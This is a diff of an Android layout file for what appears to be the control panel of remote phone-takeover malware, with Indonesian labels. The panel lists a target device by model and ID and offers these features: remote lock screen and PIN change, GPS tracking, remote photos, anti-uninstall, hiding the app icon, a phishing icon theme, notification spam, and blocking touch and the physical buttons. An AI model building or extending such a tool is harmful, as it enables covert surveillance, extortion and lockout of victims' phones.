@@ -6,16 +6,114 @@
     android:orientation="vertical"
     android:padding="16dp">
 
-    <TextView
-        android:layout_width="wrap_content"
+    <!-- Header -->
+    <LinearLayout
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="PARAGON"
-        android:textColor="#00FF41"
-        android:textSize="28sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="24dp"
-        android:layout_gravity="center"/>
+        android:orientation="vertical">
 
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal">
+
+            <TextView
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:text="vivo Y20s"
+                android:textColor="#00FF41"
+                android:textSize="18sp"
+                android:textStyle="bold" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="1e5b8925ea01bef1"
+                android:textColor="#888888"
+                android:textSize="12sp" />
+        </LinearLayout>
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="ONLINE"
+                android:textColor="#00FF41"
+                android:textSize="14sp"
+                android:textStyle="bold" />
+
+            <LinearLayout
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:orientation="horizontal"
+                android:gravity="end">
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Anti Uninstall"
+                    android:textColor="#FFFFFF"
+                    android:textSize="14sp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="OFF"
+                    android:textColor="#FF1744"
+                    android:textSize="14sp"
+                    android:layout_marginStart="8dp"
+                    android:layout_marginEnd="8dp" />
+
+                <Switch
+                    android:id="@+id/swAntiUninstall"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:thumbTint="#FF1744"
+                    android:trackTint="#333333" />
+            </LinearLayout>
+        </LinearLayout>
+
+        <Button
+            android:id="@+id/btnGanti"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:text="GANTI"
+            android:textColor="#00FF41"
+            android:background="#1A1A1A"
+            android:textStyle="bold"
+            android:layout_marginTop="8dp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="vivo Y20s"
+            android:textColor="#FFFFFF"
+            android:textSize="14sp"
+            android:layout_marginTop="8dp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="1e5b8925ea01bef1"
+            android:textColor="#888888"
+            android:textSize="12sp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="78%"
+            android:textColor="#00FF41"
+            android:textSize="14sp"
+            android:textStyle="bold" />
+    </LinearLayout>
+
+    <!-- KONTROL DEVICE -->
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
@@ -23,110 +121,59 @@
         android:textColor="#00FF41"
         android:textSize="18sp"
         android:textStyle="bold"
-        android:layout_marginBottom="24dp"/>
+        android:layout_marginTop="24dp"
+        android:layout_marginBottom="16dp" />
 
-    <Button
-        android:id="@+id/btnGanti"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="GANTI TARGET"
-        android:textColor="#00FF41"
-        android:background="@drawable/tombol_border"
-        android:layout_marginBottom="16dp"/>
-
-    <Switch
-        android:id="@+id/swLockScreen"
-        android:layout_width="match_parent"
-        android:layout_height="56dp"
-        android:text="Lock Screen"
-        android:textColor="#FFFFFF"
-        android:thumbTint="#FF1744"
-        android:trackTint="#333333"
-        android:layout_marginBottom="16dp"/>
-
-    <EditText
-        android:id="@+id/etNewPin"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:hint="PIN baru (4 digit)"
-        android:inputType="numberPassword"
-        android:textColor="#FFFFFF"
-        android:textColorHint="#666666"
-        android:background="@drawable/edittext_border"
-        android:padding="12dp"
-        android:layout_marginBottom="16dp"/>
-
-    <Button
-        android:id="@+id/btnSetPin"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="SET PIN"
-        android:textColor="#0A0A0A"
-        android:background="#00FF41"
-        android:textStyle="bold"
-        android:layout_marginBottom="24dp"/>
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="FITUR TAMBAHAN"
-        android:textColor="#00FF41"
-        android:textSize="18sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="16dp"/>
-
-    <Button
-        android:id="@+id/btnGPS"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="📍 GPS - Lacak Lokasi"
-        android:textColor="#FFFFFF"
-        android:background="#FF1744"
-        android:layout_marginBottom="8dp"/>
-
-    <Button
-        android:id="@+id/btnCamera"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="📸 Ambil Foto"
-        android:textColor="#FFFFFF"
-        android:background="#FF1744"
-        android:layout_marginBottom="8dp"/>
-
-    <Button
-        android:id="@+id/btnWallpaper"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="🖼 Ganti Wallpaper"
-        android:textColor="#FFFFFF"
-        android:background="#FF1744"
-        android:layout_marginBottom="8dp"/>
-
-    <Button
-        android:id="@+id/btnBlockButtons"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="🔒 Matiin Tombol Fisik"
-        android:textColor="#FFFFFF"
-        android:background="#FF1744"
-        android:layout_marginBottom="8dp"/>
-
-    <Button
-        android:id="@+id/btnSpamNotif"
-        android:layout_width="match_parent"
-        android:layout_height="48dp"
-        android:text="📨 Spam Notifikasi"
-        android:textColor="#FFFFFF"
-        android:background="#FF1744"
-        android:layout_marginBottom="8dp"/>
-
-    <TextView
-        android:id="@+id/tvResult"
+    <!-- Fitur -->
+    <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text=""
-        android:textColor="#FFFFFF"
-        android:textSize="14sp"
-        android:layout_marginTop="16dp"/>
+        android:orientation="vertical">
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Flashlight" />
+            <TextView style="@style/FiturStatus" android:text="OFF" />
+            <Switch android:id="@+id/swFlashlight" style="@style/FiturSwitch" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Lock low" />
+            <TextView style="@style/FiturStatus" android:text="OFF" />
+            <Switch android:id="@+id/swLockLow" style="@style/FiturSwitch" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Lock Custom V2" />
+            <TextView style="@style/FiturStatus" android:text="OFF" />
+            <Switch android:id="@+id/swLockCustom" style="@style/FiturSwitch" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Tema Phising" />
+            <Button android:id="@+id/btnTemaPhising" style="@style/FiturButton" android:text="TAP, GANTI ICON" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Hide Icon" />
+            <TextView style="@style/FiturStatus" android:text="OFF" />
+            <Switch android:id="@+id/swHideIcon" style="@style/FiturSwitch" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Video Overlay" />
+            <Button android:id="@+id/btnVideoOverlay" style="@style/FiturButton" android:text="TAP, PLAY VIDEO" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Spam Notifikasi" />
+            <Button android:id="@+id/btnSpamNotif" style="@style/FiturButton" android:text="TAP, SPAM DIALOG" />
+        </LinearLayout>
+
+        <LinearLayout style="@style/FiturItem">
+            <TextView style="@style/FiturLabel" android:text="Stuck Layar" />
+            <Button android:id="@+id/btnStuckLayar" style="@style/FiturButton" android:text="TAP, BLOCK TOUCH" />
+        </LinearLayout>
+
+    </LinearLayout>
 
 </LinearLayout>
